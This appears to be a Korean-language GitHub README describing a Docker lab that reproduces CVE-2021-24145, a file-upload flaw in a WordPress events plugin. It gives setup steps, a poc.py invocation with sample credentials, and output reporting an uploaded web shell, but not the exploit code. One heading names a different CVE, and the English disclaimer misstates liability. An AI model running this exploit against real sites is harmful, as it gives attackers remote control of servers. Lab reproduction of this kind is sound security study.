# CVE-2021-24145
WordPress File Upload Vulnerability, Modern Events Calendar Lite WordPress plugin before 5.16.5
https://nvd.nist.gov/vuln/detail/CVE-2021-24145

# CVE-2021-32644
위 취약점은 Modern Events Calendar Lite WordPress plugin에서 발견된 File upload 취약점입니다. 

# 설치 및 실행 순서

#### 1. WordPress 설치
설치를 진행할 때, docker-compose.yml 파일에서 포트포워딩을 진행해주시기 바랍니다. 
<pre> $ docker-compose up  </pre>

#### 2. WordPress initial & Plugin installation
http://[web-server ip]:port/로 이동합니다.
기본적인 설치를 진행합니다.
<img src="https://user-images.githubusercontent.com/43310843/129432375-9bbf1bc8-9eb1-41cb-9f76-fdb2b686cbde.png" width="700">
<br>[Plugins] -> [Add New] -> [Upload Plugin] 이동합니다. 
<br>modern-events-calendar-lite.5.16.2.zip 을 업로드 및 설치합니다. 
<img src="https://user-images.githubusercontent.com/43310843/129432458-b3d22de4-234a-4f29-9bad-722f39f8010a.png" width="700">
<br>아래 화면은 플러그인 설치가 완료된 모습입니다. 
<img src="https://user-images.githubusercontent.com/43310843/129432806-fdb03a36-883c-4b6b-8f3a-9ea7e89d9644.png" width="700">
<br>설치가 완료되었으면 플러그인을 활성화 시킵니다. 
#### 3. PoC
python3 poc.py -T [URL] -P [PORT] -U [Path] -u [admin] -p [password]
<pre>
 $python3 poc.py -T 172.30.1.48 -P 80 -U / -u 0ppr2s -p 123456

  ______     _______     ____   ___ ____  _      ____  _  _   _ _  _  ____
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | || || ___|
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| | || ||___ \
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |__   _|__) |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|  |_||____/

                * Wordpress Plugin Modern Events Calendar Lite RCE

                * @Hacker5preme




[+] Authentication successfull !

[+] Shell Uploaded to: http://172.30.1.48:80//wp-content/uploads/shell.php
</pre>
![image](https://user-images.githubusercontent.com/43310843/129433145-435ee861-ff32-459e-a15b-6ec19980cff4.png)

# 출처
https://github.com/Hacker5preme/Exploits/tree/main/Wordpress/CVE-2021-24145

# 주의 사항
#### 위 취약점을 불법으로 악용할 시, 법적 책임을 지지 않습니다.
#### If you illegally exploit the above vulnerabilities, you will not be held liable.
#### docker 버전을 최신화 해야 합니다.

